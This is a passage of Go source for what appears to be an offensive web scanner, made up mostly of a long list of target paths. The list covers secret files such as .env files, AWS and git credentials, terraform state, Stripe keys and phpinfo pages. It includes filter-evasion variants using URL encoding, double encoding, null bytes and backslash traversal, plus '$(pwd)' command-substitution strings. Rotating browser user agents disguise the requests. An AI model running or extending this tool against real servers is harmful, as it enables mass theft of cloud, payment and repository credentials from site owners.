package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
)

var (
	red       = color.New(color.FgRed).SprintFunc()
	whiteBold = color.New(color.Bold, color.FgWhite).SprintFunc()
	redBg     = color.New(color.FgWhite, color.BgRed).SprintFunc()
	symbol    = red("-  ")
)

type jsDomainStatus struct {
	sync.RWMutex
	awsFound     bool
	fileCount    int
	lastScanTime time.Time
}

var allowedExtensions = []string{
	"js", "php", "xml", "json", "yaml", "yml", "conf", "ini", "cfg", "log", "py", "env", "git",
	"bak", "backup", "old", "tmp", "swp", "config", "properties", "sql", "db", "pem", "key",
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
}

var sensitivePaths = []string{
	"/",
	"/.git/config",
	"/backend/.env",
	"/%2eenv",
	"/%2f%2eenv",
	"/.env",
	"/%2egit/%63onfig",
	"/%62ackend/%2eenv",
	"/%2fbackend%2f%2eenv",
	"/%2f%2eaws%2fcredentials",
	"/info.php",
	"/error/",
	"/api/user",
	"/..%5c..%5c..%5c..%5c..%5c..%5cvar/log/apache2/access.log",
	"/var/task/next.config.js",
	"/var/task/next.config.mjs",
	"/var/task/next.config.ts",
	"/app/next.config.js",
	"/app/next.config.mjs",
	"$(pwd)/next.config.js",
	"$(pwd)/next.config.mjs",
	"/var/task/nuxt.config.js",
	"/var/task/nuxt.config.ts",
	"/app/nuxt.config.js",
	"/var/task/serverless.yml",
	"/var/task/serverless.yaml",
	"/var/task/serverless.json",
	"/app/serverless.yml",
	"/app/serverless.yaml",
	"$(pwd)/serverless.yml",
	"$(pwd)/serverless.yaml",
	"/var/task/package.json",
	"/app/package.json",
	"$(pwd)/package.json",
	"/var/task/vercel.json",
	"/app/vercel.json",
	"$(pwd)/vercel.json",
	"/var/task/netlify.toml",
	"/app/netlify.toml",
	"$(pwd)/netlify.toml",
	"/var/task/docker-compose.yml",
	"/var/task/docker-compose.yaml",
	"/app/docker-compose.yml",
	"$(pwd)/docker-compose.yml",
	"/.dockerignore",
	"/docker/overlay/config.json",
	"/opt/mailcow-dockerized/mailcow.conf",
	"/Dockerfile",
	"/docker/registry/config.yml",
	"/docker-compose.yml",
	"/.docker/config.json",
	"/.docker/secrets.json",
	"/attacker/docker-compose.yml",
	"/_vercel/insights",
	"/vercel.json",
	"/aws/bucket",
	"/aws/buckets",
	"/aws/config/s3.json",
	"/aws/s3/credentials",
	"/aws/s3/env.env",
	"/aws_s3_bucket",
	"/aws_s3_config.json",
	"/s3/.aws/config",
	"/config/aws.php",
	"/.aws/config",
	"/aws-codecommit/",
	"/aws.yaml",
	"/old/aws_config",
	"/aws.env.json",
	"/aws.env",
	"/aws-ses.json",
	"/aws/ses/smtp.env",
	"/aws/metadata",
	"/aws.json",
	"/aws.yml",
	"/.aws/credentials",
	"/.env.aws",
	"/s3/credentials",
	"/s3/bucket.env",
	"/s3/bucket",
	"/s3/buckets",
	"/s3/backup",
	"/s3.yml",
	"/s3.yaml",
	"/s3.properties",
	"/s3.key",
	"/s3.secret",
	"/s3/.env.bak",
	"/root/.aws/credentials",
	"/root/.aws/config",
	"/home/*/.aws/credentials",
	"/.boto",
	"/root/.boto",
	"/.s3cfg",
	"/root/.s3cfg",
	"/etc/boto.cfg",
	"/.terraform/credentials.tfrc.json",
	"/terraform.tfstate",
	"/terraform.tfstate.backup",
	"/.terraform.tfstate",
	"/serverless.yml",
	"/serverless.yaml",
	"/sam-template.yaml",
	"/template.yaml",
	"/amplify/team-provider-info.json",
	"/.amplifyrc",
	"$(pwd)/terraform.tfstate",
	"$(pwd)/.terraform/terraform.tfstate",
	"$(pwd)/terraform.tfvars",
	"$(pwd)/*.auto.tfvars",
	"/app/terraform.tfstate",
	"/app/.terraform/terraform.tfstate",
	"~/.aws/credentials",
	"~/.aws/config",
	"~/.boto",
	"~/.s3cfg",
	"/.terraform.lock.hcl",
	"/terraform.tfvars",
	"/terraform/terraform.tfvars.json",
	"/var/task/amplify.yml",
	"/var/task/amplify.yaml",
	"/app/amplify.yml",
	"/app/amplify.yaml",
	"/var/task/amplify/backend/function/*/src/index.js",
	"$(pwd)/.env",
	"$(pwd)/.env.local",
	"$(pwd)/.env.production",
	"$(pwd)/.env.development",
	"$(pwd)/.env.staging",
	"/app/.env",
	"/app/.env.local",
	"/app/.env.production",
	"/var/www/.env",
	"/var/www/html/.env",
	"/opt/.env",
	"/srv/.env",
	"/.env.example",
	"/api/.env",
	"/laravel/.env",
	"/env",
	"/.git",
	"/.git/HEAD",
	"/.git/index",
	"/.git/logs/HEAD",
	"/.git/logs/refs/heads/master",
	"/.git/logs/refs/heads/main",
	"/.git/logs/refs/remotes/origin/master",
	"/.git/logs/refs/remotes/origin/main",
	"/.git/hooks",
	"/.git/info/exclude",
	"/.git/refs/heads/master",
	"/.git/refs/heads/main",
	"/.git/refs/remotes/origin/HEAD",
	"/.git/packed-refs",
	"/.git/objects",
	"/.git/COMMIT_EDITMSG",
	"/.git/description",
	"/.git/FETCH_HEAD",
	"/.git/ORIG_HEAD",
	"/.github",
	"/.github/workflows",
	"/.github/workflows/main.yml",
	"/.github/workflows/ci.yml",
	"/.github/dependabot.yml",
	"/.github/CODEOWNERS",
	"/.github/ISSUE_TEMPLATE",
	"/.github/PULL_REQUEST_TEMPLATE.md",
	"/.github/funding.yml",
	"/.github/stale.yml",
	"/.gitlab-ci.yml",
	"/.gitlab",
	"/.gitlab/issue_templates",
	"/.gitlab/merge_request_templates",
	"/.gitlab-ci",
	"/.gitignore",
	"/.gitattributes",
	"/.gitmodules",
	"/.git-credentials",
	"/.git-askpass.sh",
	"/.git-secret",
	"/.git/hooks/pre-commit",
	"/.git/hooks/post-commit",
	"/.git/info",
	"/.git/objects/info",
	"/.git/objects/pack",
	"/.git/config.bak",
	"/.git/config.old",
	"/.git/config~",
	"/.git/",
	"/root/.git-credentials",
	"/root/.gitconfig",
	"/root/.netrc",
	"/home/*/.git-credentials",
	"/home/*/.gitconfig",
	"/home/*/.netrc",
	"~/.git-credentials",
	"~/.gitconfig",
	"~/.netrc",
	"/app/.git/config",
	"$(pwd)/.git/config",
	"/wp-json/wp/v2/users",
	"/wp-content/debug.log",
	"/_profiler/phpinfo",
	"/phpinfo.php",
	"/etc/apache2/apache2.conf",
	"/package-updates/*.cgi",
	"/software/*.cgi?*u=*",
	"/package-updates/*?*update*",
	"/webhook/*",
	"/webhook-test/*",
	"/form/*",
	"/form-test/*",
	"/webhook",
	"/form",
	"/rest/oauth1-credential/auth",
	"/rest/oauth2-credential/auth",
	"/rest/workflows",
	"/rest/executions",
	"/rest/workflows/run",
	"/api/v1/*",
	"/api/v1/workflows",
	"/api/v1/executions",
	"/api/v1/credentials",
	"/__debug",
	"/.well-known/*",
	"/healthz",
	"/metrics",
	"/rest/*",
	"/rest/settings",
	"/rest/login",
	"/rest/logout",
	"/rest/users",
	"/rest/node-types",
	"/rest/credentials-for-node",
	"/rest/credential-translation",
	"/rest/tags",
	"/rest/variables",
	"/rest/license",
	"/webhook-waiting/*",
	"/chat/*",
	"/chat",
	"/*update.cgi*",
	"/sysinfo.cgi",
	"/proc/index.cgi",
	"/servers/link.cgi",
	"/servers/save.cgi",
	"/package-updates/apt.cgi",
	"/package-updates/yum.cgi",
	"/package-updates/save.cgi",
	"/package-updates/refresh.cgi",
	"/package-updates/perform.cgi",
	"/package-updates/download.cgi",
	"/package-updates/install.cgi",
	"/package-updates/update.cgi",
	"/package-updates/index.cgi",
	"/software/update.cgi",
	"/software/install-updates.cgi",
	"/package-updates/",
	"/webmin/package-updates/update.cgi",
	"/_next/data/*/index.json",
	"/_next/data/*/about.json",
	"/_next/data/*/*.json",
	"/_next/static/*",
	"/api/*",
	"/api/auth/*",
	"/api/users/*",
	"/api/data/*",
	"/api/webhook/*",
	"/__nextjs_action",
	"/__nextjs_action/*",
	"/app/*",
	"/dashboard/*",
	"/admin/*",
	"/user/*",
	"/profile/*",
	"/settings/*",
	"/[slug]",
	"/[id]",
	"/[...catchAll]",
	"/[[...optional]]",
	"/about",
	"/contact",
	"/products",
	"/blog",
	"/docs",
	"/_react/action/*",
	"/_react/data/*",
	"/actions/*",
	"/loaders/*",
	"/waku/*",
	"/_waku/*",
	"/*",
	"/*/[id]",
	"/*/[slug]",
	"/v1/*",
	"/v2/*",
	"/graphql",
	"/trpc/*",
	"/auth/*",
	"/login",
	"/register",
	"/signup",
	"/oauth/*",
	"/console/*",
	"/manage/*",
	"/posts/*",
	"/articles/*",
	"/pages/*",
	"/content/*",
	"/cart",
	"/checkout",
	"/orders/*",
	"/payment/*",
	"/workspaces/*",
	"/projects/*",
	"/teams/*",
	"/billing/*",
	"/integrations/*",
	"/cms/*",
	"/editor/*",
	"/media/*",
	"/publish/*",
	"/threads/*",
	"/messages/*",
	"/notifications/*",
	"/.netlify/functions/*",
	"/.vercel/functions/*",
	"/api/serverless/*",
	"/[locale]/*",
	"/en/*",
	"/fr/*",
	"/[tenant]/*",
	"/[workspace]/*",
	"/shop/[category]/*",
	"/blog/[year]/[month]/[slug]",
	":27017",
	":27018",
	":27019",
	":28017",
	"/.well-known/acme-challenge/*",
	"/.well-known/acme-challenge/",
	"/dnscfg.cgi",
	"/_layouts/*",
	"/_layouts/15/*",
	"/_api/*",
	"/_vti_bin/*",
	"/sendgrid.env",
	"/.env.testing",
	"/admin.html",
	"/.env.development",
	"/test",
	"/.env.production",
	"/oauth/authorize",
	"/.env.test",
	"/api/login",
	"/config/secrets.yml",
	"/api/credentials",
	"/.env.local",
	"/.env.prod",
	"/wp-config.php",
	"/controlpanel",
	"/.cache",
	"/config/stripe.yaml",
	"/.well-known/stripe.txt",
	"/payment/stripe.json",
	"/stripe.yaml",
	"/payment_gateways/stripe.yaml",
	"/stripe/config.json",
	"/src/config/stripe.ts",
	"/client/stripe.config.js",
	"/stripe.env",
	"/stripe.config.js",
	"/stripe/webhook_secret.env",
	"/public/stripe.js",
	"/config/stripe.php",
	"/webhooks/incoming/stripe.json",
	"/stripe-keys.json",
	"/src/config/stripe.js",
	"/stripe.json",
	"/stripe-credentials.json",
	"/.well-known/stripe/",
	"/.stripe/",
	"/stripe/.env",
	"/config/stripe.json",
	"/plugins/payments/stripe.json",
	"/%2f",
	"/%252f",
	"/%00",
	"/%2fabout",
	"/%252fabout",
	"/about%00",
	"/%2fblog",
	"/%252fblog",
	"/blog%00",
	"/%2fcart",
	"/%252fcart",
	"/cart%00",
	"/%2fcheckout",
	"/%252fcheckout",
	"/checkout%00",
	"/%2fcontact",
	"/%252fcontact",
	"/contact%00",
	"/%2fdocs",
	"/%252fdocs",
	"/docs%00",
	"/%2flogin",
	"/%252flogin",
	"/login%00",
	"/%2fproducts",
	"/%252fproducts",
	"/products%00",
	"/%2fregister",
	"/%252fregister",
	"/register%00",
	"/%2fsignup",
	"/%252fsignup",
	"/signup%00",
	"/swagger/2ejson",
	"/%2fswagger%2f2ejson",
	"/%252fswagger%252f2ejson",
	"/swagger/%002ejson",
	"/%2ftest",
	"/%252ftest",
	"/test%00",
	"/craco%2econfig%2ejs",
	"/%2fcraco%252econfig%252ejs",
	"/%252fcraco%25252econfig%25252ejs",
	"/craco%2econfig.%00js",
	"/var/task/next%2econfig%2ejs",
	"/%2fvar%2ftask%2fnext%252econfig%252ejs",
	"/%252fvar%252ftask%252fnext%25252econfig%25252ejs",
	"/var/task/next%2econfig.%00js",
	"/var/task/next%2econfig%2emjs",
	"/%2fvar%2ftask%2fnext%252econfig%252emjs",
	"/%252fvar%252ftask%252fnext%25252econfig%25252emjs",
	"/var/task/next%2econfig.%00mjs",
	"/var/task/next%2econfig%2ets",
	"/%2fvar%2ftask%2fnext%252econfig%252ets",
	"/%252fvar%252ftask%252fnext%25252econfig%25252ets",
	"/var/task/next%2econfig.%00ts",
	"/app/next%2econfig%2ejs",
	"/%2fapp%2fnext%252econfig%252ejs",
	"/%252fapp%252fnext%25252econfig%25252ejs",
	"/app/next%2econfig.%00js",
	"/app/next%2econfig%2emjs",
	"/%2fapp%2fnext%252econfig%252emjs",
	"/%252fapp%252fnext%25252econfig%25252emjs",
	"/app/next%2econfig.%00mjs",
	"/var/task/nuxt%2econfig%2ejs",
	"/%2fvar%2ftask%2fnuxt%252econfig%252ejs",
	"/%252fvar%252ftask%2fnuxt%25252econfig%25252ejs",
	"/var/task/nuxt%2econfig.%00js",
	"/var/task/nuxt%2econfig%2ets",
	"/%2fvar%2ftask%2fnuxt%252econfig%252ets",
	"/%252fvar%252ftask%2fnuxt%25252econfig%25252ets",
	"/var/task/nuxt%2econfig.%00ts",
	"/app/nuxt%2econfig%2ejs",
	"/%2fapp%2fnuxt%252econfig%252ejs",
	"/%252fapp%252fnuxt%25252econfig%25252ejs",
	"/app/nuxt%2econfig.%00js",
	"/var/task/package%2ejson",
	"/%2fvar%2ftask%2fpackage%252ejson",
	"/%252fvar%252ftask%2fpackage%25252ejson",
	"/var/task/package.%00json",
	"/app/package%2ejson",
	"/%2fapp%2fpackage%252ejson",
	"/%252fapp%252fpackage%25252ejson",
	"/app/package.%00json",
	"/%252f%252eenv",
	"/.%00env",
	"/%2f%252eenv",
	"/%252f%25252eenv",
	"/%2eenv%00",
	"/%2f%252f%2eenv",
	"/%252f%25252f%252eenv",
	"/%2f%2eenv%00",
	"/%2f%252egit%252f%2563onfig",
	"/%252f%25252egit%25252f%252563onfig",
	"/%2egit/%63onfig%00",
	"/%2f%25252f%252eenv",
	"/%252f%2525252f%25252eenv",
	"/%252f%252eenv%00",
	"/%2f%2egit%2fconfig",
	"/%252f%252egit%252fconfig",
	"/.git/%00config",
	"/phpinfo",
	"/%2fphpinfo",
	"/%252fphpinfo",
	"/phpinfo%00",
	"/%2fphpinfo%2ephp",
	"/%252fphpinfo%252ephp",
	"/phpinfo.%00php",
	"/portal/.env",
	"/%2fportal%2f%2eenv",
	"/%252fportal%252f%252eenv",
	"/portal/%00.env",
	"/env/.env",
	"/%2fenv%2f%2eenv",
	"/%252fenv%252f%252eenv",
	"/env/%00.env",
	"/home/phpinfo",
	"/%2fhome%2fphpinfo",
	"/%252fhome%252fphpinfo",
	"/home/%00phpinfo",
	"/new/.env.local",
	"/%2fnew%2f%2eenv%2elocal",
	"/%252fnew%252f%252eenv%252elocal",
	"/new/%00.env.local",
	"/site/.env",
	"/%2fsite%2f%2eenv",
	"/%252fsite%252f%252eenv",
	"/site/%00.env",
	"/mail/.env",
	"/%2fmail%2f%2eenv",
	"/%252fmail%252f%252eenv",
	"/mail/%00.env",
	"/%5fprofiler%2fphpinfo",
	"/%255fprofiler%252fphpinfo",
	"/_profiler/%00phpinfo",
	"/.env.swp",
	"/%2f%2eenv%2eswp",
	"/%252f%252eenv%252eswp",
	"/.%00env.swp",
	"/docker/app/.env",
	"/%2fdocker%2fapp%2f%2eenv",
	"/%252fdocker%252fapp%252f%252eenv",
	"/docker/app/%00.env",
	"/laravel/core/.env",
	"/%2flaravel%2fcore%2f%2eenv",
	"/%252flaravel%252fcore%252f%252eenv",
	"/laravel/core/%00.env",
	"/laravel/info.php",
	"/%2flaravel%2finfo%2ephp",
	"/%252flaravel%252finfo%252ephp",
	"/laravel/%00info.php",
	"/laravel/.env.staging",
	"/%2flaravel%2f%2eenv%2estaging",
	"/%252flaravel%252f%252eenv%252estaging",
	"/laravel/%00.env.staging",
	"/.env.bak",
	"/%2f%2eenv%2ebak",
	"/%252f%252eenv%252ebak",
	"/.%00env.bak",
	"/conf/.env",
	"/%2fconf%2f%2eenv",
	"/%252fconf%252f%252eenv",
	"/conf/%00.env",
	"/.env.old",
	"/%2f%2eenv%2eold",
	"/%252f%252eenv%252eold",
	"/.%00env.old",
	"/%2f%2egit%2fHEAD",
	"/%252f%252egit%252fHEAD",
	"/.git/%00HEAD",
	"/%2f%2egit%2findex",
	"/%252f%252egit%252findex",
	"/.git/%00index",
	"/%2f%2egit%2flogs%2fHEAD",
	"/%252f%252egit%252flogs%252fHEAD",
	"/.git/logs/%00HEAD",
	"/%2f%2egit%2frefs%2fheads%2fmaster",
	"/%252f%252egit%252frefs%252fheads%252fmaster",
	"/.git/refs/heads/%00master",
	"/%2f%2egit%2dcredentials",
	"/%252f%252egit%252dcredentials",
	"/.git%2dcredentials%00",
	"/.git/config/user",
	"/%2f%2egit%2fconfig%2fuser",
	"/%252f%252egit%252fconfig%252fuser",
	"/.git/config/%00user",
	"/.git/config/worktree",
	"/%2f%2egit%2fconfig%2fworktree",
	"/%252f%252egit%252fconfig%252fworktree",
	"/.git/config/%00worktree",
	"/.git/modules/*/config",
	"/%2f%2egit%2fmodules%2f%2aconfig",
	"/%252f%252egit%252fmodules%252f%252aconfig",
	"/.git/modules/%00config",
	"/%2f%2egit%2flogs%2frefs%2fheads%2fmain",
	"/%252f%252egit%252flogs%252frefs%252fheads%252fmain",
	"/.git/logs/refs/heads/%00main",
	"/%2f%2egit%2fORIG%5fHEAD",
	"/%252f%252egit%252fORIG%255fHEAD",
	"/.git/%00ORIG_HEAD",
	"/%2f%2egit%2fFETCH%5fHEAD",
	"/%252f%252egit%252fFETCH%255fHEAD",
	"/.git/%00FETCH_HEAD",
	"/%2f%2egit%2fpacked%2drefs",
	"/%252f%252egit%252fpacked%252drefs",
	"/.git/%00packed-refs",
	"/%2f%2egit%2finfo%2fexclude",
	"/%252f%252egit%252finfo%252fexclude",
	"/.git/info/%00exclude",
	"/%2f%2egit%2frefs%2fremotes%2forigin%2fHEAD",
	"/%252f%252egit%252frefs%252fremotes%252forigin%252fHEAD",
	"/.git/refs/remotes/origin/%00HEAD",
	"/.git/refs/remotes/origin/master",
	"/%2f%2egit%2frefs%2fremotes%2forigin%2fmaster",
	"/%252f%252egit%252frefs%252fremotes%252forigin%252fmaster",
	"/.git/refs/remotes/origin/%00master",
	"/.git/logs/refs/remotes/origin/HEAD",
	"/%2f%2egit%2flogs%2frefs%2fremotes%2forigin%2fHEAD",
	"/%252f%252egit%252flogs%252frefs%252fremotes%252forigin%252fHEAD",
	"/.git/logs/refs/remotes/origin/%00HEAD",
	"/var/www/.git/config",
	"/%2fvar%2fwww%2f%2egit%2fconfig",
	"/%252fvar%252fwww%252f%252egit%252fconfig",
	"/var/www/.git/%00config",
	"/home/user/project/.git/config",
	"/%2fhome%2fuser%2fproject%2f%2egit%2fconfig",
	"/%252fhome%252fuser%252fproject%252f%252egit%252fconfig",
	"/home/user/project/.git/%00config",
	"/opt/app/.git/HEAD",
	"/%2fopt%2fapp%2f%2egit%2fHEAD",
	"/%252fopt%252fapp%252f%252egit%252fHEAD",
	"/opt/app/.git/%00HEAD",
	"/dev/.env",
	"/%2fdev%2f%2eenv",
	"/%252fdev%252f%252eenv",
	"/dev/%00.env",
	"/_phpinfo.php",
	"/%5fphpinfo%2ephp",
	"/%255fphpinfo%252ephp",
	"/_phpinfo.%00php",
	"/.vscode/.env",
	"/%2f%2evscode%2f%2eenv",
	"/%252f%252evscode%252f%252eenv",
	"/.vscode/%00.env",
	"/new/.env.production",
	"/%2fnew%2f%2eenv%2eproduction",
	"/%252fnew%252f%252eenv%252eproduction",
	"/new/%00.env.production",
	"/nginx/.env",
	"/%2fnginx%2f%2eenv",
	"/%252fnginx%252f%252eenv",
	"/nginx/%00.env",
	"/laravel/.env.production",
	"/%2flaravel%2f%2eenv%2eproduction",
	"/%252flaravel%252f%252eenv%252eproduction",
	"/laravel/%00.env.production",
	"/.env_1",
	"/%2f%2eenv%5f1",
	"/%252f%252eenv%255f1",
	"/.%00env_1",
	"/mailer/.env",
	"/%2fmailer%2f%2eenv",
	"/%252fmailer%252f%252eenv",
	"/mailer/%00.env",
	"/%2fapp%2f%2eenv",
	"/%252fapp%252f%252eenv",
	"/app/%00.env",
	"/_profiler/phpinfo/info.php",
	"/%5fprofiler%2fphpinfo%2finfo%2ephp",
	"/%255fprofiler%252fphpinfo%252finfo%252ephp",
	"/_profiler/phpinfo/%00info.php",
	"/.env.www",
	"/%2f%2eenv%2ewww",
	"/%252f%252eenv%252ewww",
	"/.%00env.www",
	"/.env.uat",
	"/%2f%2eenv%2euat",
	"/%252f%252eenv%252euat",
	"/.%00env.uat",
	"/.env.live",
	"/%2f%2eenv%2elive",
	"/%252f%252eenv%252elive",
	"/.%00env.live",
	"/product/.env.staging",
	"/%2fproduct%2f%2eenv%2estaging",
	"/%252fproduct%252f%252eenv%252estaging",
	"/product/%00.env.staging",
	"/www/.env",
	"/%2fwww%2f%2eenv",
	"/%252fwww%252f%252eenv",
	"/www/%00.env",
	"/.docker/laravel/app/.env",
	"/%2f%2edocker%2flaravel%2fapp%2f%2eenv",
	"/%252f%252edocker%252flaravel%252fapp%252f%252eenv",
	"/.docker/laravel/app/%00.env",
	"/awstats/.env",
	"/%2fawstats%2f%2eenv",
	"/%252fawstats%252f%252eenv",
	"/awstats/%00.env",
	"/node_modules/.env",
	"/%2fnode%5fmodules%2f%2eenv",
	"/%252fnode%255fmodules%252f%252eenv",
	"/node_modules/%00.env",
	"/test.php",
	"/%2ftest%2ephp",
	"/%252ftest%252ephp",
	"/test.%00php",
	"/workspace/.aws/credentials",
	"/%2fworkspace%2f%2eaws%2fcredentials",
	"/%252fworkspace%252f%252eaws%252fcredentials",
	"/workspace/.aws/%00credentials",
	"/customer/.gitlab-ci.yml",
	"/%2fcustomer%2f%2egitlab%2dci%2eyml",
	"/%252fcustomer%252f%252egitlab%252dci%252eyml",
	"/customer/.gitlab%2dci.%00yml",
	"/Helmetjs/.env",
	"/%2fHelmetjs%2f%2eenv",
	"/%252fHelmetjs%252f%252eenv",
	"/Helmetjs/%00.env",
	"/%2fwp%2dconfig%2ephp",
	"/%252fwp%252dconfig%252ephp",
	"/wp%2dconfig.%00php",
	"/%2froot%2f%2eaws%2fcredentials",
	"/%252froot%252f%252eaws%252fcredentials",
	"/root/.aws/%00credentials",
	"/laravel/core/.env.local",
	"/%2flaravel%2fcore%2f%2eenv%2elocal",
	"/%252flaravel%252fcore%252f%252eenv%252elocal",
	"/laravel/core/%00.env.local",
	"/laravel/core/.env.staging",
	"/%2flaravel%2fcore%2f%2eenv%2estaging",
	"/%252flaravel%252fcore%252f%252eenv%252estaging",
	"/laravel/core/%00.env.staging",
	"/docker/.env",
	"/%2fdocker%2f%2eenv",
	"/%252fdocker%252f%252eenv",
	"/docker/%00.env",
	"/xampp/phpinfo.php",
	"/%2fxampp%2fphpinfo%2ephp",
	"/%252fxampp%252fphpinfo%252ephp",
	"/xampp/%00phpinfo.php",
	"/home/.env",
	"/%2fhome%2f%2eenv",
	"/%252fhome%252f%252eenv",
	"/home/%00.env",
	"/shared/.env",
	"/%2fshared%2f%2eenv",
	"/%252fshared%252f%252eenv",
	"/shared/%00.env",
	"/%2f%2eenv%2eexample",
	"/%252f%252eenv%252eexample",
	"/.%00env.example",
	"/%2fapi%2f%2eenv",
	"/%252fapi%252f%252eenv",
	"/api/%00.env",
	"/admin/.env",
	"/%2fadmin%2f%2eenv",
	"/%252fadmin%252f%252eenv",
	"/admin/%00.env",
	"/laravel/core/.env.production",
	"/%2flaravel%2fcore%2f%2eenv%2eproduction",
	"/%252flaravel%252fcore%252f%252eenv%252eproduction",
	"/laravel/core/%00.env.production",
	"/lara/info.php",
	"/%2flara%2finfo%2ephp",
	"/%252flara%252finfo%252ephp",
	"/lara/%00info.php",
	"/.env.dev",
	"/%2f%2eenv%2edev",
	"/%252f%252eenv%252edev",
	"/.%00env.dev",
	"/new/.env",
	"/%2fnew%2f%2eenv",
	"/%252fnew%252f%252eenv",
	"/new/%00.env",
	"/aws-secret.yaml",
	"/%2faws%2dsecret%2eyaml",
	"/%252faws%252dsecret%252eyaml",
	"/aws%2dsecret.%00yaml",
	"/_profiler/phpinfo/phpinfo.php",
	"/%5fprofiler%2fphpinfo%2fphpinfo%2ephp",
	"/%255fprofiler%252fphpinfo%252fphpinfo%252ephp",
	"/_profiler/phpinfo/%00phpinfo.php",
	"/laravel/.env.local",
	"/%2flaravel%2f%2eenv%2elocal",
	"/%252flaravel%252f%252eenv%252elocal",
	"/laravel/%00.env.local",
	"/.docker/.env",
	"/%2f%2edocker%2f%2eenv",
	"/%252f%252edocker%252f%252eenv",
	"/.docker/%00.env",
	"/main/.env",
	"/%2fmain%2f%2eenv",
	"/%252fmain%252f%252eenv",
	"/main/%00.env",
	"/content/.env",
	"/%2fcontent%2f%2eenv",
	"/%252fcontent%252f%252eenv",
	"/content/%00.env",
	"/xampp/.env",
	"/%2fxampp%2f%2eenv",
	"/%252fxampp%252f%252eenv",
	"/xampp/%00.env",
	"/.env.backup",
	"/%2f%2eenv%2ebackup",
	"/%252f%252eenv%252ebackup",
	"/.%00env.backup",
	"/%2flaravel%2f%2eenv",
	"/%252flaravel%252f%252eenv",
	"/laravel/%00.env",
	"/docs/.env",
	"/%2fdocs%2f%2eenv",
	"/%252fdocs%252f%252eenv",
	"/docs/%00.env",
	"/storage/.env.local",
	"/%2fstorage%2f%2eenv%2elocal",
	"/%252fstorage%252f%252eenv%252elocal",
	"/storage/%00.env.local",
	"/%2f%2eenv%2elocal",
	"/%252f%252eenv%252elocal",
	"/.%00env.local",
	"/core/.env",
	"/%2fcore%2f%2eenv",
	"/%252fcore%252f%252eenv",
	"/core/%00.env",
	"/lara/phpinfo.php",
	"/%2flara%2fphpinfo%2ephp",
	"/%252flara%252fphpinfo%252ephp",
	"/lara/%00phpinfo.php",
	"/.env_sample",
	"/%2f%2eenv%5fsample",
	"/%252f%252eenv%255fsample",
	"/.%00env_sample",
	"/new/.env.staging",
	"/%2fnew%2f%2eenv%2estaging",
	"/%252fnew%252f%252eenv%252estaging",
	"/new/%00.env.staging",
	"/public/.env",
	"/%2fpublic%2f%2eenv",
	"/%252fpublic%252f%252eenv",
	"/public/%00.env",
	"/media/.env",
	"/%2fmedia%2f%2eenv",
	"/%252fmedia%252f%252eenv",
	"/media/%00.env",
	"/docker/database/.env",
	"/%2fdocker%2fdatabase%2f%2eenv",
	"/%252fdocker%252fdatabase%252f%252eenv",
	"/docker/database/%00.env",
	"/icons/.env",
	"/%2ficons%2f%2eenv",
	"/%252ficons%252f%252eenv",
	"/icons/%00.env",
	"/blue/.env",
	"/%2fblue%2f%2eenv",
	"/%252fblue%252f%252eenv",
	"/blue/%00.env",
	"/etc/mail/sendmail.cf",
	"/%2fetc%2fmail%2fsendmail%2ecf",
	"/%252fetc%252fmail%252fsendmail%252ecf",
	"/etc/mail/sendmail.%00cf",
	"/etc/postfix/main.cf",
	"/%2fetc%2fpostfix%2fmain%2ecf",
	"/%252fetc%252fpostfix%252fmain%252ecf",
	"/etc/postfix/main.%00cf",
	"/etc/ssmtp/ssmtp.conf",
	"/%2fetc%2fssmtp%2fssmtp%2econf",
	"/%252fetc%252fssmtp%252fssmtp%252econf",
	"/etc/ssmtp/ssmtp.%00conf",
	"/etc/exim4/exim4.conf",
	"/%2fetc%2fexim4%2fexim4%2econf",
	"/%252fetc%252fexim4%252fexim4%252econf",
	"/etc/exim4/exim4.%00conf",
	"/etc/exim4/update-exim4.conf.conf",
	"/%2fetc%2fexim4%2fupdate%2dexim4%2econf%2econf",
	"/%252fetc%252fexim4%252fupdate%252dexim4%252econf%252econf",
	"/etc/exim4/update-exim4.%00conf.conf",
	"/info.php.bak",
	"/%2finfo%2ephp%2ebak",
	"/%252finfo%252ephp%252ebak",
	"/info.%00php.bak",
	"/php-info.php",
	"/%2fphp%2dinfo%2ephp",
	"/%252fphp%252dinfo%252ephp",
	"/php%2dinfo.%00php",
	"/newinfo.php",
	"/%2fnewinfo%2ephp",
	"/%252fnewinfo%252ephp",
	"/newinfo.%00php",
	"/siteinfo.php",
	"/%2fsiteinfo%2ephp",
	"/%252fsiteinfo%252ephp",
	"/siteinfo.%00php",
	"/info.php.1",
	"/%2finfo%2ephp%2e1",
	"/%252finfo%252ephp%252e1",
	"/info.%00php.1",
	"/admin/phpinfo.php",
	"/%2fadmin%2fphpinfo%2ephp",
	"/%252fadmin%252fphpinfo%252ephp",
	"/admin/%00phpinfo.php",
	"/pageinfo.php",
	"/%2fpageinfo%2ephp",
	"/%252fpageinfo%252ephp",
	"/pageinfo.%00php",
	"/info.php.back",
	"/%2finfo%2ephp%2eback",
	"/%252finfo%252ephp%252eback",
	"/info.%00php.back",
	"/phpbb/phpinfo.php",
	"/%2fphpbb%2fphpinfo%2ephp",
	"/%252fphpbb%252fphpinfo%252ephp",
	"/phpbb/%00phpinfo.php",
	"/release_info.php",
